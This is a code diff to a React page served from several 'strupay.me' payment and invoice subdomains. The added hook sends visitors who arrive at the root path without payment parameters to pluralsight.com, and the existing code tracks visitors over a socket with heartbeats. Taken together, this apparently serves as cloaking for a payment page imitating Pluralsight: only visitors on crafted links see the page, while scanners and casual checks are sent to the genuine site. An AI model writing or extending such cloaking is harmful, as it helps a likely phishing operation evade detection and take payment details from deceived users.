@@ -17,6 +17,38 @@ const Index = () => {
   const [socket, setSocket] = useState<Socket | null>(null);
   const heartbeatIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
+  // Redirect unauthorized direct access to pluralsight.com
+  useEffect(() => {
+    const checkAuthorizedAccess = () => {
+      // Check if this is a custom domain and direct access (no payment parameters)
+      const hostname = window.location.hostname;
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      const isCustomDomain = hostname.includes('strupay.me') || 
+                            hostname === 'pay.strupay.me' || 
+                            hostname === 'invoice.strupay.me' || 
+                            hostname === 'www.strupay.me';
+      
+      // Check if this is direct access (no payment-related parameters)
+      const hasPaymentParams = urlParams.has('plan') || 
+                              urlParams.has('billing') || 
+                              urlParams.has('amount') || 
+                              urlParams.has('merchant') ||
+                              urlParams.has('customAmount') ||
+                              window.location.pathname.includes('/checkout') ||
+                              window.location.pathname.includes('/payment');
+      
+      // If custom domain and no payment params, redirect to pluralsight
+      if (isCustomDomain && !hasPaymentParams && window.location.pathname === '/') {
+        console.log('Unauthorized direct access detected, redirecting to pluralsight.com');
+        window.location.href = 'https://www.pluralsight.com';
+        return;
+      }
+    };
+    
+    checkAuthorizedAccess();
+  }, []);
+
   // Set up visitor tracking when component mounts
   useEffect(() => {
     const connectSocket = () => {
